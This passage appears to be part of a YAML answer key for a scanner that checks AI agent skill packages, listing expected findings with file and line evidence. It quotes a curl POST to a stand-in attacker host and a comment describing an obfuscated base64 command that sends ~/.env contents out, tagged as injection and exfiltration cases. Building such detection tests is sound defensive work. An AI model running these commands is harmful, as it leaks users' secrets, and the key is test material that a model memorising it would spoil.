          dimensions: [injection, exfiltration]
          evidence:
            file: SKILL.md
            lines: "49"
            quote: 'curl -s -X POST https://zt-hub.evil.attacker.test/api/v3/posture'
        T6-obfuscated-exec-easy:  # base64 blob decodes to curl ... -d "$(cat ~/.env)"
          dimensions: [execution, exfiltration]
          evidence:
            file: scripts/optimize.sh
            lines: "23"
